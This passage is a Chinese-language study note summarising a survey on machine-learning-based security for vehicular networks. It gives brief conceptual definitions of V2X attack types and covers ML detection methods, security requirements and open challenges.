<li>Node Impersonation：在這種類型的攻擊中，攻擊者竊取授權用戶的身份以獲得對系統的訪問權限。</li>
<li>GPS Spoofing：這種攻擊試圖通過在車輛周圍生成虛假信號來欺騙全球定位系統 (GPS)，其中 GPS 傳感器捕獲虛假信號並記錄虛假坐標，以誤導車輛網絡的功能。</li>
<li>Tampering Hardware : 這是一種通過提供虛假信息或在車輛周圍創建虛假環境來欺騙車輛硬體的攻擊類型。</li>
<li>Routing Attack : 這種攻擊導致路由過程的不正常運行。 路由攻擊進一步分為不同的攻擊，對應於網絡中不同級別的路由過程的故障。 在硬體方面，節點的存在和位置的錯誤通信可能會影響網絡中的路由表</li>
</ul>
</li>
<li>Infrastructure-based attacks: 這些攻擊針對車輛網絡的基礎設施組件，例如路邊單元 (RSU) 或雲服務器。 基於基礎設施的攻擊示例包括中間人 (MitM) 攻擊、重放攻擊或女巫攻擊。<ul>
<li>Repudiation Attack：他的攻擊發生在應用層，由於惡意操作，系統無法控制操作日誌和節點跟踪。 它也被稱為拒絕系統中的動作的行為。</li>
<li>Platoon Attack：Platoon 是一種將在同一車道上行駛的車輛分組在一起的概念，這些車輛之間的距離很近且速度規則相似。 攻擊者為破壞排的功能而採取的任何類型的行動</li>
<li>Session Hijacking：會話劫持是一種攻擊類型，攻擊者試圖劫持並訪問車輛和目標節點之間建立的數據傳輸會話。</li>
<li>Key-Certificate Replication：在這種攻擊中，攻擊者使用合法用戶的重複密鑰和證書來欺騙 TA 並獲得對網絡的訪問權限。</li>
<li>Unauthorized Access：這是對車輛網絡身份驗證系統的攻擊。在這種攻擊中，攻擊者試圖通過破壞其身份驗證參數來訪問車輛節點系統、服務器、控制器或網絡的任何其他組件，例如 解密系統帳戶的登錄標識 (ID) 和密碼。</li>
</ul>
</li>
<li>Sensor-based attacks: 這些攻擊針對車載網絡的傳感器組件，例如攝像頭或激光雷達。 基於傳感器的攻擊示例包括欺騙、干擾或物理篡改。<ul>
<li>Illusion Attack：在這種攻擊中，敵方車輛欺騙自己的傳感器產生錯誤的讀數並傳輸到網絡。 這會在道路上產生虛假的場景錯覺，以誤導其他車輛並生成錯誤的警告信息。</li>
<li>Jamming Attack：在這種攻擊中，干擾器的目的是通過發送虛假警報或在傳感器周圍創建欺騙環境來阻止或乾擾來自傳感器的數據傳輸</li>
</ul>
</li>
<li><p>Wireless communication-based attacks: 這些攻擊針對車輛用於相互通信或與基礎設施組件通信的無線通信信道。 基於無線通信的攻擊示例包括竊聽、消息修改或位置跟踪。</p>
<ul>
<li>Brute-Force Attack：這是對用於在 V2X 通信中傳輸數據的無線協議的身份驗證系統的攻擊。 對手運行暴力算法來創建不同的密碼或密碼組合，以打破對媒體的訪問。</li>
<li>Spoofing Attack：在車載應用中，可能會發生一種不同類型的欺騙攻擊，其中攻擊者偽裝成網絡的合法用戶以獲取對個人信息的訪問權限。 欺騙攻擊不僅限於身份欺騙，還包括位置、域名服務器 (DNS) 信息、互聯網協議 (IP) 地址等。</li>
<li>ID Fingerprinting：在車載網絡中，對駕駛員進行正確識別和真實分析以防止汽車被黑客入侵和盜竊至關重要。 在 ID 指紋識別中，攻擊者旨在<br>獲取驅動程序配置文件並使用它對系統發起攻擊。</li>
<li>Location Trailing：這種攻擊通過非法訪問傳輸車輛個人信息的通道來侵犯隱私。 在這裡，對手可以跟踪目標車輛的完整路徑並跟踪其位置。</li>
<li>Sybil Attack：Sybil 攻擊是最常見且易於實施的攻擊之一。 車載網絡中的女巫攻擊會創建虛擬節點以發起攻擊，並且檢測此類虛擬節點並不容易。</li>
<li>Denial of Service (DoS)：這是一種難以應對且實施頻率很高的攻擊。 在這種攻擊中，攻擊者通過服務器或任何其他節點發起大量欺騙請求以進行<br>它完全佔用了不必要的請求並阻止了對合法用戶的訪問。</li>
<li>Spamming Attack : 在這種攻擊中，攻擊者發送大量垃圾郵件以消耗網絡帶寬並增加數據傳輸的延遲。</li>
<li>Jamming Attack : 在這種攻擊中，干擾器的目的是通過佔用信道或發送虛假警報來阻止或乾擾授權傳輸。</li>
<li><p>Grey-Hole and Black-Hole Attack : 黑洞和灰洞攻擊是無線路由攻擊的類型。 在這些攻擊中，節點試圖停止向接收方轉發消息/數據包。 在黑洞攻擊中，將完全中斷或丟包。 然而，在灰洞攻擊中，會發生部分數據包丟失，部分數據包被攻擊者更改以向接收方傳達錯誤信息。</p>
<p><img src="img/vehicle_Untitled_2.png" alt="Untitled"></p>
</li>
<li><p>Man-in-the-Middle (MiTM) Attack : 在 MiTM 中，攻擊者通過攔截信道聽到兩個節點之間正在進行的通信，並假裝是其中之一以錯誤信息回复。</p>
</li>
<li>Eavesdropping：這是一種嗅探攻擊，攻擊者在其中窺探兩個實體之間傳輸的信息。 在此攻擊中，它不會更改或回復任何實體，而只會偵聽和訪問個人信息。</li>
</ul>
</li>
<li><p>機器學習 (ML) 技術可用於檢測和防止這些攻擊</p>
<ol>
<li><p>監督學習Supervised learning：監督學習算法可以在標記數據上進行訓練，以檢測已知的攻擊並做出準確的預測或決策。</p>
<blockquote>
<p>在監督學習中，訓練數據集的每個條目都包含一個輸入值及其對應的標籤。 監督算法學習輸入樣本和訓練集標籤之間的關係，並使用它來映射測試數據的新實例 [17]。<br> 監督學習進一步分為classification and regression。</p>
<blockquote>
<p>classification模型的輸出是categorical or discrete的。 車載網絡安全性常用的分類模型有K-Nearest Neighbour (KNN) [105] [106], Decision Tree [107], Naive Bayes [108], Support Vector Machine (SVM) [109], and Neural Network (NN) [110]。</p>
<p>regression模型的輸出是一個連續值。 用於保護車輛網絡的最常見回歸模型是logistic regression [111], random forest [112], and NN [113]。</p>
</blockquote>
</blockquote>
<p> 在車載網絡中，監督學習的使用適用於不同的應用程序，例如駕駛員指紋識別、不當行為類型、攻擊檢測和信任計算（第四節）。</p>
</li>
<li><p>無監督學習Unsupervised learning：無監督學習算法可用於發現數據中可能指示以前未知攻擊的模式或異常。</p>
<blockquote>
<p>與監督學習相反，無監督學習僅在其訓練數據集中包含輸入值。 在無監督學習中，沒有為數據集使用預先分配的標籤。 無監督學習是從未標記的信息中找到數據的隱藏模式。 結果，類似結構的數據被聚類到同一組中。 無監督算法在數據處理方面高效且快速。</p>
<ul>
<li>無監督算法分為聚類和降維應用。<ul>
<li>在clustering中，輸入樣本根據不同的相似性屬性（例如相對或絕對相似性）分組在一起。 通過隨機選擇聚類質心進行分組，並且從中心計算所有值的相似性屬性。 質心的選擇不斷變化，直到找到最佳匹配。 車載網絡中最常見的安全聚類機制是 k 均值聚類 [114]、隱馬爾可夫模型 (HMM) [115] 和神經網絡 [116]。</li>
<li>在dimensionality reduction中，數據在不丟失有用信息的情況下從高維投影到低維[17]。 降維技術優化速度更快，複雜度更低，但可能會降低學習過程。 在車載網絡的安全性方面，文獻 [117] 考慮了使用線性判別分析 (LDA) 作為降維機制。</li>
</ul>
</li>
</ul>
</blockquote>
</li>
<li><p>強化學習Reinforcement learning(RL)：強化學習算法可以學習動態環境下安全決策的最優策略</p>
<blockquote>
<p>目標是學習一種策略，幫助代理在給定環境中採取最佳行動 [118]。 代理根據收到的獎勵生成要學習的數據，並嘗試通過使用試錯法與環境交互來最大化正獎勵。 環境是一個Markov decision process，其中獎勵和狀態轉移概率由觀察和動作選擇定義 [21]。 RL 的策略是找到最大化未來獎勵的動作。<br> 最流行和廣泛使用的 RL 方法之一是 Q-learning。 Q-learning 使用 Bellman equation作為約束來最大化累積獎勵 [118]。 它旨在通過應用動作選擇策略來最大化預期的獎勵總和。</p>
<p>在實踐中，Q-learning 會生成一個查找表來存儲動作和預期獎勵的組合。 這需要更大的內存，並且當對數據使用一組連續的操作時，有時會變得效率低下。 作為解決方案，提出了 DRL 網絡，它涉及 DL 和 RL 的組合以處理更大的數據集 [119]。RL、DRL 及其變體的使用被廣泛用於車載網絡的安全性。</p>
</blockquote>
<p><img src="img/vehicle_Untitled_3.png" alt="The conceptual framework of RL"></p>
<p>The conceptual framework of RL</p>
</li>
<li><p>深度學習Deep learning：深度學習算法如卷積神經網絡（CNNs）和遞歸神經網絡（RNNs）可用於分析大量數據並做出準確的預測或決策。</p>
<blockquote>
<p>DL 是 ML 的一個子集，但與傳統的 ML 算法形成對比。 它不像傳統 ML 那樣需要特徵工程。 在 DL 中，它通過算法的自我優化自行學習數據模式 [120]。<br> DL 找到傳統 ML 難以學習的模式。 原始數據以其原始形式（未經預處理）可以直接應用於深度學習算法進行分類、回歸和決策制定，無需顯式編程。</p>
<p>DL 非常適合非線性數據模式 [121]，它以監督、部分監督、無監督或強化的方式工作。</p>
<p>人工神經網絡 (ANN) 來自神經網絡的初始設計之一 [122]，而多層感知器 (MLP) 是最簡單和最常用的 ANN 版本 [123]。 MLP 也稱為feedforward-ANN。 MLP 是一種分層模型，由三部分組成，即輸入層、中間隱藏層或計算層以及輸出層。</p>
<p>MLP 可以建模為有監督或無監督的學習過程 [124]。 MLP由於採用fully-connected design，面臨low convergence efficiency and high working complexity的問題。 儘管存在這些缺點，ANN 架構仍用於 VANET [125] 中的駕駛員 ID 指紋識別、攻擊檢測和入侵檢測應用。</p>
<p>另一種變體，深度神經網絡 (DNN) 是具有deep (multiple) hidden layers的 ANN [126]。</p>
<p>使用deep structure of layers的優點是：</p>
<p>1)使設計兼容學習更大的數據集。</p>
<p>2) 與淺層網絡相比，深度網絡學習更複雜的功能，</p>
<p>3)深度網絡架構有助於實現更高的準確性 [127]。 另一方面，更深的網絡在處理時間和convergence方面引入了更高的複雜性。 根據optimization function and information flow，它可以進一步分為不同的類型。 </p>
<ol>
<li>Fully-Connected DNN (FCDNN) 由一系列層組成，其中每個輸入都連接到下一層的每個神經元，依此類推。 由於這種多樣化的連接性，它被稱為全連接網絡。</li>
<li>Convolutional Neural Network (CNN) 是文獻中流行且廣泛實施的 DNN 之一，它在多維數據方面取得了出色的性能。 它之所以被稱為 CNN，是因為它在其網絡設計 [127] 中的不同層使用了卷積的數學運算。 在 CNN [128] 中廣泛觀察到監督和非監督方法的使用。 這使得它有望在使用未標記數據集的入侵檢測系統 (IDS) 中得到應用。 CNN 具有良好訓練性能的優勢，由於weight sharing and pooling operations，它使用較少的參數。 CNN對語音、圖像等多維數據的處理效果最佳。</li>
<li>Recurrent Neural Network (RNN) 是一種遞歸 DNN，其中神經元使用feedback looping structure，其中神經元的新輸出取決於先前的輸出和當前輸入 [129]。 RNN 能夠隨時間存儲狀態。 有許多應用 CNN 不夠好，例如理解視頻（即圖像序列）或文本塊中的時間信息。 RNN 專門設計用於處理當前數據點與前一個數據點存在某種關係的序列數據。 長短期記憶 (LSTM) 是一種流行的 RNN 設計，廣泛用於生成長序列時間序列數據（例如交通流量、傳感器讀數和車輛軌跡）的車輛網絡。</li>
</ol>
</blockquote>
</li>
<li>集成方法Ensemble methods：集成方法如隨機森林或梯度提升可以結合多個 ML 模型以提高accuracy and robustness。</li>
<li><p>遷移學習Transfer learning：遷移學習技術可以利用預先訓練的模型或來自相關領域的知識來提高 ML 模型在檢測攻擊方面的性能。</p>
<p> <img src="img/vehicle_Untitled_4.png" alt="The conceptual framework of TL"></p>
<p> The conceptual framework of TL</p>
</li>
<li><p>聯邦學習Federated learning : FL 是一種分佈式機器學習技術，它使多方能夠協作訓練模型而無需彼此共享數據。 在車載網絡環境中，FL 可用於訓練模型以檢測攻擊或異常，同時保護個別車輛生成的敏感數據的隱私。</p>
<p><img src="img/vehicle_Untitled_5.png" alt="The conceptual framework of FL"></p>
<p>The conceptual framework of FL</p>
<p><img src="img/vehicle_Untitled_6.png" alt="ML-BASED LITERATURE TO DETECT OR PREVENT ADVERSARIES AT
DIFFERENT LEVELS OF COMMUNICATIONS"></p>
<p>ML-BASED LITERATURE TO DETECT OR PREVENT ADVERSARIES AT<br>DIFFERENT LEVELS OF COMMUNICATIONS</p>
</li>
</ol>
</li>
<li><p>本文對基於 ML 的車載網絡安全技術進行了全面調查。</p>
  <aside>
  💡

  本文側重於車載網絡安全，並從基於 ML 的解決方案的角度專門總結了這些工作。 作者首先介紹了車載網絡及其變體的基礎知識，以及採用各種技術（例如 5G、SDN、物聯網、邊緣計算和雲計算）來實現智能交通應用。 然後，他們提出了車載網絡的安全挑戰和要求。

  本文還研究了可用於檢測和防止對車載網絡的攻擊的不同類型的 ML 算法。 這些包括監督學習、無監督學習、強化學習、深度學習、集成方法和遷移學習。

  作者還討論了可能影響車載網絡安全的不同類型的攻擊。 這些包括對抗性攻擊、中毒攻擊、干擾攻擊、竊聽攻擊、Sybil 攻擊、DoS 攻擊和 MitM 攻擊。

  此外，本文研究了不同的方法來解決與使用基於 ML 的車載網絡安全解決方案相關的挑戰。 其中包括使用旨在提高計算效率且需要更少資源的輕量級 DL 模型； 使用傳統的 ML 算法，例如決策樹或支持向量機 (SVM)，其計算複雜度低於 DL 算法； 或將計算卸載到更強大的邊緣或霧節點。

  </aside>


</li>
</ul>
<p><img src="img/vehicle_Untitled_7.png" alt="The conceptual block diagram of a typical ML model."></p>
<p>The conceptual block diagram of a typical ML model.</p>
<p>車載網絡基礎：</p>
<ul>
<li><p>討論了網絡架構、車輛網絡的變體、用於數據傳輸的通信類型以及安全攻擊和要求的分類。</p>
<blockquote>
<p>網絡架構：本文討論了支持車輛網絡中智能交通應用的不同網絡架構。 其中包括 5G、軟體定義網絡 (SDN)、物聯網 (IoT)、邊緣計算和雲計算。</p>
<p>車輛網絡的變體：本文討論了車輛網絡的不同變體，包括車輛對車輛 (V2V) 通信、車輛對基礎設施 (V2I) 通信和車輛對一切 (V2X) 通信。</p>
</blockquote>
<p>  <img src="img/vehicle_Untitled_8.png" alt="Variants of vehicular networks and related work"></p>
<p>  Variants of vehicular networks and related work</p>
<p>  <img src="img/vehicle_Untitled_9.png" alt="VEHICULAR NETWORK VARIANTS AND ADVANTAGES"></p>
<p>  VEHICULAR NETWORK VARIANTS AND ADVANTAGES</p>
<blockquote>
<p>用於數據傳輸的通信類型：本文討論了用於車載網絡數據傳輸的不同通信類型。 其中包括專用短程通信 (DSRC)、蜂窩車聯網 (C-V2X) 和 IEEE 802.11p。</p>
<ul>
<li>安全攻擊的分類和要求：包括physical layer attacks, MAC layer attacks, network layer attacks, transport layer attacks, application layer attacks, and social engineering attacks。</li>
<li><p>車載網絡的各種安全挑戰和要求:confidentiality, integrity, availability, authentication, non-repudiation, privacy preservation, trust management, intrusion detection/prevention systems (IDS/IPS), and driver identification/fingerprinting。</p>
<ul>
<li>保密性Confidentiality : 最基本的要求之一是保證只有合法用戶才能訪問數據。 機密性使用基於安全密鑰和可信證書的加密技術來確保只有合法的數據用戶才能訪問。 大多數保密工作都是關於密鑰管理的。<br>如果攻擊者可以訪問密鑰，他就可以闖入系統並濫用機密數據。 因此，在車載網絡中保證機密性對於保護車輛和駕駛員的個人數據非常重要</li>
<li>可用性Availability :  確保任何網絡的應用程序和進程的功能可用性是一項重要的安全要求。 有許多針對 VANET 中服務或通信通道可用性的嚴重攻擊很難處理 [13]。 不同類型的攻擊可能發生在網絡的不同級別。 如果出現意外情況，提前採取措施並確保系統的可用性對於網絡的成功運行至關重要。 在發生攻擊時保持車輛和基礎設施之間的通信正常運行是基本安全要求之一。 我們在第 IV 節中討論了不同的基於 ML 的解決方案來檢測攻擊並確保可用性。</li>
<li>完整性Integrity :  在將數據從車輛傳輸到基礎設施或從車輛傳輸到車輛時，保持數據和信息的真實形式非常重要。 數據的任何更改或更改都可能導致不良序列。車載網絡的完整性是為了確保原創性<br>數據並保護其免受對手的任何更改、破壞或更改。 文獻中通常使用公鑰基礎設施 (PKI) 和密碼方案來確保車輛網絡的完整性 [8]。</li>
<li>隱私Privacy :  隱私是車載網絡安全的一項極其重要的要求。 它是一種保護車輛敏感信息免受攻擊者攻擊的方法。 在車載網絡的上下文中，它進一步分為位置隱私和用戶隱私。 駕駛員/車輛的位置和身份非常敏感，必須對攻擊者隱藏。 然而，可信機構必須知道位置信息以提供更好的服務。 有許多基於用戶位置向用戶提供服務的 LBS。 在這種情況下，保護位置的隱私免受攻擊者的攻擊，同時確保其對服務提供實體的安全可用性是非常具有挑戰性的 [16]。</li>
<li>身份驗證Authentication : 在向系統請求任何服務之前，車輛總是會向系統驗證自己的身份。 有兩種類型的認證，消息認證和節點認證。 當車輛成為任何新網絡的一部分時，它會通過網絡驗證其節點信息（即身份、地址和相關信息）。 這有助於系統區分合法節點和惡意節點。 但是，當消息在兩輛車之間傳輸時，必須對其進行身份驗證以確保完整性。 無法維護車載網絡安全的第一步可能會導致網絡完全損壞。</li>
<li><p>信任Trust : 是安全的一個重要方面，用於增強系統對攻擊者的保護級別。 信任可以歸類為一個實體對屬於同一組網絡的另一個實體的信念。 在車載網絡中，信任計算是安全要求的附加步驟，與隱私保護、可用性和密鑰管理一起使用，以確保數據的高度安全傳輸 [14]。 文獻中存在信任計算方案（在面向實體和麵向數據的背景下），它利用網絡中車輛的歷史交互將其分類為可信的 [97]。 在車載網絡中，通過執行信任計算作為基本安全要求來確保車輛之間的誠實非常重要</p>
<p><img src="img/vehicle_Untitled_10.png" alt="Security requirements and ML-based literature"></p>
<p>Security requirements and ML-based literature</p>
</li>
</ul>
</li>
</ul>
<p><img src="img/vehicle_Untitled_11.png" alt="V2X RF Vulnerabilities and Attack Vectors"></p>
<p>V2X RF Vulnerabilities and Attack Vectors</p>
</blockquote>
</li>
</ul>
<p>車輛網絡安全中的 ML 方法：</p>
<ul>
<li>討論了不同的 ML 方法，例如監督學習、無監督學習和強化學習。</li>
</ul>
<p><img src="img/vehicle_Untitled_12.png" alt="ML TECHNIQUES APPLIED TO VEHICULAR SECURITY"></p>
<p>ML TECHNIQUES APPLIED TO VEHICULAR SECURITY</p>
<ul>
<li>深度學習、決策樹、支持向量機 (SVM) 和隨機森林是一些常用的 ML 技術。</li>
</ul>
<p><img src="img/vehicle_Untitled_13.png" alt="ML approaches in the context of vehicular network security"></p>
<p>ML approaches in the context of vehicular network security</p>
<p>文獻綜述：</p>
<ul>
<li>本文回顧了使用 ML 策略提供不同安全和隱私解決方案的文獻。</li>
<li>它簡要解釋和比較了不同的解決方案，並提供了解決方案的表格形式。</li>
</ul>
<p><img src="img/vehicle_Untitled_14.png" alt="COMPARISON OF SURVEYS ON ML AND/OR SECURITY IN VEHICULAR NETWORKS"></p>
<p>COMPARISON OF SURVEYS ON ML AND/OR SECURITY IN VEHICULAR NETWORKS</p>
<p><img src="img/vehicle_Untitled_15.png" alt="Security solutions and ML-based literature."></p>
<p>Security solutions and ML-based literature.</p>
<p><img src="img/vehicle_Untitled_16.png" alt="SUMMARY OF LITERATURE ON DRIVER IDENTIFICATION OR FINGERPRINTINGS USING ML"></p>
<p>SUMMARY OF LITERATURE ON DRIVER IDENTIFICATION OR FINGERPRINTINGS USING ML</p>
<p><img src="img/vehicle_Untitled_17.png" alt="SUMMARY OF LITERATURE ON ATTACK DETECTION USING ML"></p>
<p>SUMMARY OF LITERATURE ON ATTACK DETECTION USING ML</p>
<p><img src="img/vehicle_Untitled_18.png" alt="SUMMARY OF LITERATURE ON MISBEHAVIOUR OR INTRUSION DETECTION USING ML"></p>
<p>SUMMARY OF LITERATURE ON MISBEHAVIOUR OR INTRUSION DETECTION USING ML</p>
<p><img src="img/vehicle_Untitled_19.png" alt="SUMMARY OF LITERATURE ON TRUST COMPUTATION USING ML"></p>
<p>SUMMARY OF LITERATURE ON TRUST COMPUTATION USING ML</p>
<p><img src="img/vehicle_Untitled_20.png" alt="SUMMARY OF LITERATURE ON PRIVACY PROTECTION USING ML"></p>
<p>SUMMARY OF LITERATURE ON PRIVACY PROTECTION USING ML</p>
<p>貢獻：</p>
<ul>
<li>作者對在車輛網絡安全中使用 ML 技術的最新技術進行了深入研究。</li>
<li>本文討論了廣泛的安全問題，包括攻擊、隱私、信任、入侵檢測和驅動程序識別/指紋識別。</li>
</ul>
<p>基於 ML 的安全挑戰解決方案：</p>
<ul>
<li>作者根據在車輛網絡應用中的使用對文獻中開發的 ML 技術進行分類。<ul>
<li>入侵檢測：使用監督學習、非監督學習或混合方法來檢測車輛網絡中的惡意活動。-</li>
<li>隱私保護：使用差分隱私、同態加密或其他隱私保護技術來保護敏感數據。</li>
<li>信任管理：使用基於信譽的系統或信任模型來評估車輛網絡中車輛和節點的可信度。</li>
<li>駕駛員身份識別/指紋識別：使用駕駛行為等生物識別數據，生理信號或面部識別來識別駕駛員並防止未經授權進入車輛。</li>
</ul>
</li>
<li><p>他們解釋了這些 ML 技術在應對各種安全挑戰時的解決方法和工作原理。</p>
<pre><code>    1.Support Vector Machines (SVMs):：
</code></pre><ul>
<li>SVM 是一種監督學習算法，可用於分類和回歸分析。</li>
<li><p>在車載網絡中，SVM 可用於入侵檢測、信任管理和駕駛員識別/指紋識別。</p>
<p>2.Decision Trees：</p>
</li>
<li><p>決策樹是一種監督學習算法，可用於分類和回歸分析。</p>
</li>
<li><p>在車載網絡中，決策樹可用於入侵檢測和駕駛員識別/指紋識別。</p>
<p>3.Random Forests：</p>
</li>
<li><p>隨機森林是一種集成學習方法，它結合了多個決策樹以提高準確性並減少過度擬合。</p>
</li>
<li><p>在車載網絡中，隨機森林可用於入侵檢測。</p>
<p>4.Deep Learning：</p>
</li>
<li><p>深度學習是機器學習的一個子集，它使用人工神經網絡對數據中的複雜模式進行建模。</p>
</li>
<li><p>在車載網絡中，深度學習可用於交通預測、軌跡預測、入侵檢測和駕駛員識別/指紋識別。</p>
<p>5.Clustering：</p>
</li>
<li><p>聚類是一種無監督學習技術，它根據相似的數據點的特徵將它們分組在一起。</p>
</li>
<li><p>在車載網絡中，聚類可用於異常檢測和入侵檢測。</p>
<p>6.Reinforcement Learning:</p>
</li>
<li><p>強化學習是一種機器學習，其中代理學習通過與其環境交互來做出決策。</p>
</li>
<li>在車載網絡中，強化學習可用於交通控制和擁塞管理。</li>
</ul>
</li>
</ul>
<p>ML 方法的優缺點:</p>
<ol>
<li>基於機器學習的車載網絡安全優勢：基於機器學習的解決方案可以檢測以前未知的攻擊並適應不斷變化的環境，使其適用於動態和復雜的車載網絡。 他們還可以分析大量數據並做出準確的預測或決策，這對於實時檢測攻擊至關重要。</li>
<li>基於 ML 的車載網絡安全的缺點：基於 ML 的解決方案需要大量的計算資源，這對於資源受限的車載網絡來說可能是一個挑戰。 它們還需要大量標記數據來訓練模型，這在實踐中可能很難獲得。 此外，如果沒有經過適當的培訓或驗證，它們可能會產生誤報或錯過一些攻擊。</li>
<li>基於 ML 的車載網絡安全的主要挑戰：本文確定了在使用基於 ML 的車載網絡安全解決方案時需要解決的幾個關鍵挑戰。 其中包括設計計算效率高且需要更少資源的輕量級模型； 開發有效的特徵選擇技術，可以從原始數據中提取相關特徵； 解決可以操縱輸入數據以逃避檢測的對抗性攻擊問題； 在收集和分析敏感數據的同時確保隱私保護。</li>
</ol>
<p>IoV 中的潛在應用：</p>
<ul>
<li>本文探討了 ML 技術在車聯網 (IoV) 中的潛在應用。<ul>
<li>交通預測、軌跡預測、擁堵控制、聯網車輛的入侵檢測以及提高車輛網絡的安全性是一些潛在的應用。<ol>
<li>Traffic prediction：<ul>
<li>機器學習技術可用於實時預測交通模式和擁堵程度。</li>
<li>此信息可用於優化交通流量並減少旅行時間。</li>
</ul>
</li>
<li>Trajectory prediction：<ul>
<li>機器學習技術可用於根據車輛的當前位置和速度預測車輛的軌跡。</li>
<li>此信息可用於避免碰撞和路線規劃。</li>
</ul>
</li>
<li>Congestion control：<ul>
<li>機器學習技術可用於控制交通流量並減少城市地區的擁堵。</li>
<li>這可以通過優化交通信號時間、重新安排車輛路線或調整限速來實現。</li>
</ul>
</li>
<li>Intrusion detection in connected vehicles:<ul>
<li>機器學習技術可用於檢測聯網車輛中的惡意活動，例如黑客攻擊或未經授權的訪問。</li>
<li>此信息可用於防止網絡攻擊和保護敏感數據。</li>
</ul>
</li>
<li>Improving the security of vehicular networks:<ul>
<li>機器學習技術可用於檢測安全威脅並防止對車輛網絡的攻擊。</li>
<li>這包括入侵檢測、信任管理、隱私保護和驅動程序識別/指紋識別。</li>
</ul>
</li>
</ol>
</li>
</ul>
</li>
</ul>
<p>局限性和挑戰：</p>
<ul>
<li>討論了在車輛網絡中使用基於 ML 的方法的局限性和挑戰<ol>
<li>訓練數據有限：<ul>
<li>機器學習算法需要大量的訓練數據來學習模式並做出準確的預測。</li>
<li>在車載網絡中，由於資源有限和隱私問題，收集足夠的訓練數據可能具有挑戰性。</li>
</ul>
</li>
<li>動態環境：<ul>
<li>車輛網絡是高度動態的環境，條件可能會迅速變化。</li>
<li>這會使 ML 算法難以適應不斷變化的條件並做出準確的預測。</li>
</ul>
</li>
<li>安全威脅：<ul>
<li>機器學習算法可能容易受到對抗性攻擊或中毒攻擊等安全威脅。</li>
<li>對手可以操縱訓練數據或將惡意代碼注入 ML 模型以損害其性能。</li>
</ul>
</li>
<li>隱私問題：<ul>
<li>機器學習算法可能需要訪問敏感數據，例如位置信息或駕駛行為。</li>
<li>這會引起隱私問題，需要仔細考慮隱私保護技術。</li>
</ul>
</li>
<li>計算複雜度：<ul>
<li>某些 ML 算法計算量大，需要強大的處理能力。</li>
<li>在車載網絡中，由於資源有限和實時要求，這可能是一個挑戰。</li>
</ul>
</li>
</ol>
</li>
</ul>
<p>觀察和經驗教訓：</p>
<ul>
<li><p>作者在結束他們的工作之前展示了觀察結果和經驗教訓</p>
<ol>
<li><p>基於機器學習的解決方案在應對車載網絡安全挑戰方面取得了顯著成就</p>
<ol>
<li>Achieving high accuracy in driver identification：</li>
</ol>
<ul>
<li>ML 技術已用於根據駕駛行為識別駕駛員。</li>
<li><p>本文介紹的一項工作使用基於決策樹的 ML 技術在 10 個駕駛員中實現了約 99% 的準確度，該技術應用了 OBD-II 協議數據的 51 個特徵。</p>
<p>b. Detecting security threats：</p>
</li>
<li><p>機器學習技術已被用於檢測安全威脅，例如聯網車輛中的入侵企圖或惡意活動。</p>
</li>
<li><p>論文中提出的一項工作使用無監督學習方法來檢測車輛網絡流量中的異常情況，準確率達到 98%。</p>
<p>c. Improving privacy preservation：</p>
</li>
<li><p>機器學習技術已被用於改進車載網絡中的隱私保護。</p>
</li>
<li><p>論文中提出的一項工作提出了一種隱私保護框架，該框架使用差分隱私並在保護隱私的同時實現了高實用性。</p>
<p>d. Enhancing trust management：</p>
</li>
<li><p>機器學習技術已被用於增強車輛網絡中的信任管理。</p>
</li>
<li>論文中提出的一項工作提出了一種信任管理框架，該框架結合了監督和非監督學習方法，並實現了高精度。</li>
</ul>
</li>
<li><p>基於機器學習的解決方案的性能取決於訓練數據的質量和數量。</p>
 <aside>
 💡 因為 ML 算法根據訓練數據學習模式並做出預測。 如果訓練數據質量差或數量不足，機器學習算法可能無法學習到準確的模式並做出準確的預測。

 </aside>

 <aside>
 💡 例如，在車載網絡中，由於資源有限和隱私問題，收集足夠的訓練數據可能具有挑戰性。 如果訓練數據有限或有偏差，ML 算法可能無法很好地泛化到新情況或準確檢測安全威脅。

 </aside>

 <aside>
 💡 因此，仔細選擇和預處理訓練數據以確保它代表問題域並包含足夠的信息以供 ML 算法學習準確的模式非常重要。 此外，數據增強或遷移學習等技術可用於增加可用訓練數據的數量並提高基於 ML 的解決方案的性能。

 </aside>
</li>
<li><p>車輛網絡的動態特性要求 ML 算法具有適應性和彈性以適應不斷變化的條件。</p>
 <aside>
 💡 車輛網絡的動態特性要求 ML 算法能夠適應不斷變化的條件並具有彈性，因為網絡拓撲、交通模式和環境條件可能會快速且不可預測地變化。

 </aside>

 <aside>
 💡 例如，在車載網絡中，車輛的移動會導致網絡拓撲結構和信號強度的頻繁變化。 此外，交通模式可能會因一天中的時間或地點而異。 這些變化可能會影響基於 ML 的解決方案的性能，這些解決方案依賴於靜態模型或關於問題域的假設。

 </aside>

 <aside>
 💡 因此，車載網絡中使用的 ML 算法需要能夠適應不斷變化的條件並實時從新數據中學習。 這需要在線學習或強化學習等技術，使算法能夠根據新的觀察結果更新其模型。 此外，遷移學習或領域適應等技術可用於改進基於 ML 的解決方案在不同場景或環境中的泛化。

 </aside>

 <aside>
 💡 總體而言，車輛網絡的動態特性要求 ML 算法能夠適應不斷變化的條件並具有彈性，以便提供準確可靠的安全解決方案。

 </aside>
</li>
<li><p>對抗性攻擊或中毒攻擊等安全威脅可能會損害基於 ML 的解決方案的性能</p>
 <aside>
 💡 因為它們可以操縱訓練數據或 ML 算法的輸入數據，從而導致不正確的預測或決策。

 </aside>

 <aside>
 💡 例如，在對抗性攻擊中，攻擊者可以故意修改輸入數據以導致 ML 算法的錯誤分類或錯誤預測。 這可以通過向輸入數據添加人類無法察覺但會顯著影響 ML 算法輸出的小擾動來實現。

 </aside>

 <aside>
 💡 同樣，在中毒攻擊中，攻擊者可以操縱用於訓練 ML 算法的訓練數據。 這可以通過將惡意樣本注入訓練數據集來完成，這些樣本旨在使模型偏向於做出不正確的預測或決策。

 </aside>

 <aside>
 💡 這些攻擊在安全性對安全和隱私至關重要的車載網絡中尤其有害。 例如，對自動駕駛汽車的對抗性攻擊可能會導致其做出錯誤的決定並導致事故。 同樣，對駕駛員身份識別系統的中毒攻擊可能會損害其準確性，並允許未經授權訪問車輛。

 </aside>

 <aside>
 💡 因此，對於車載網絡中使用的基於 ML 的解決方案來說，能夠抵禦這些類型的攻擊非常重要。 對抗性訓練或異常值檢測等技術可用於提高抵禦對抗性攻擊的能力。 此外，數據清理或異常檢測等技術可用於檢測和減輕中毒攻擊。

 </aside>
</li>
<li><p>隱私保護技術對於保護車載網絡中的敏感數據至關重要。</p>
 <aside>
 💡 隱私保護技術對於保護車載網絡上的敏感數據至關重要，因為車載網絡經常傳輸敏感信息，例如位置、駕駛員身份和車輛狀態。 攻擊者可以使用此信息來跟踪個人或車輛的移動、危及乘客的安全或竊取個人信息。

 </aside>

 <aside>
